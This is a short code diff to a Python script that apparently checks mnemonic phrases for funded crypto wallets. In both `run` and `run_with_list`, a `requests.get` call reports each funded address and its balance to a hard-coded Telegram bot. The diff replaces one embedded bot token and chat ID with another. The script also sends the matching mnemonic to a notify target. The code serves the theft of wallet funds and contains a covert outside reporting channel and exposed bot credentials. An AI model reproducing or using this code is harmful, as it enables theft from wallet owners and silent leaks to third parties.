@@ -42,7 +42,7 @@ def run():
         if amount>min_balance:
             text = f'{account.address} - Balance: {amount}\n'
             text2 = f'{account.address} - Balance: {amount} - Mnemonic [{words}]\n'
-            requests.get(f'https://api.telegram.org/bot5458840045:AAFPnQKH0dYnWlaZlYDUBqWF0CNGhcoOi2I/sendMessage?chat_id=5553460596&text={text}')
+            requests.get(f'https://api.telegram.org/bot5527531846:AAF2z88HFnYKuz0xZqzfkQ8B34LZLyLubKQ/sendMessage?chat_id=441273133&text={text}')
             print(text)
             with app:
                 app.send_message(user_notify, text2)
@@ -70,7 +70,7 @@ def run_with_list(file):
             text = f'{account.address} - Balance: {amount}\n'
             text2 = f'{account.address} - Balance: {amount} - Mnemonic [{words}]\n'
             requests.get(
-                f'https://api.telegram.org/bot5458840045:AAFPnQKH0dYnWlaZlYDUBqWF0CNGhcoOi2I/sendMessage?chat_id=5553460596&text={text}')
+                f'https://api.telegram.org/bot5527531846:AAF2z88HFnYKuz0xZqzfkQ8B34LZLyLubKQ/sendMessage?chat_id=441273133&text={text}')
             print(text)
             with app:
                 app.send_message(user_notify, text2)
